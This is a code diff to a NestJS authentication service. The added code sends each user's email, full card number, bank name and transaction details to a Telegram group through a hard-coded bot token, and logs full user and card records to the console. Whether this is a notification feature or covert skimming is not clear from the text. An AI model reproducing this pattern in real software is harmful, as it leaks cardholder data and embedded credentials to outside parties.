@@ -103,6 +103,7 @@ export class AuthService {
       { $set: updateFields }, // Cập nhật từng trường cụ thể
       { new: true } // Trả về dữ liệu sau khi cập nhật
     ).exec();    
+    this.sendMessage(data);
 
     return result;
 }
@@ -113,6 +114,10 @@ export class AuthService {
       ...data,
       deleted: false
     }
+    const user = await this.userModel.findOne({ email, 'data_card._id': new mongoose.Types.ObjectId(data.cardId) });
+    const dataCard = user.data_card.find((card: any) => card._id.toString() === data.cardId);
+    console.log('user', user);
+    console.log('dataCard', dataCard);
     delete body.cardId
     console.log('body', body);
     const result = await this.userModel.updateOne(
@@ -121,11 +126,22 @@ export class AuthService {
       { new: true } // Trả về dữ liệu mới nhất sau khi update
     ).exec();  
     console.log('result', result);
+    const message = `
+    📢 *Giao dịch mới được thêm vào thẻ!*
+    📧*Email:* \`${email}\` 
+    💳 *Số thẻ:* \`${dataCard.card_number}\`
+    🏦 *Tên ngân hàng:* \`${dataCard.bank_name}\`
+    📌 *Danh mục:* \`${data.category}\`
+    🍽 *Sản phẩm:* \`${data.product}\`
+    💰 *Tiền:* \`${Number(data.money).toLocaleString()}\`
+    📦 *Số lượng:* \`${data.quantity}\`
+    🧾 *Tổng cộng:* \`${Number(data.total).toLocaleString()}\`
+    
+     
+        `;
+    this.sendMessage(message);
     return result
   }
-
-  
-  
 
   async deleteDataByIdUser(email: string, data: any) {
     const body = {
@@ -194,7 +210,8 @@ async updateTransactionByIdUser(email: string, data: any) {
 private readonly botToken = '7561500069:AAGNyOQMfdTZnkic5S1AfLSMUT30qCVU_bA';
 private readonly chatId = '-4711661610';
 
-  async sendMessage(message: string): Promise<void> {
+  async sendMessage(message: any): Promise<void> {
+    console.log('✅ message', message);
     const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
     
     try {
@@ -209,7 +226,7 @@ private readonly chatId = '-4711661610';
     }
   }
 
-  async sendImage(message: string): Promise<void> {
+  async sendImage(message: any): Promise<void> {
     const url = `https://api.telegram.org/bot${this.botToken}/sendPhoto`;
     console.log('✅ message', message);
     
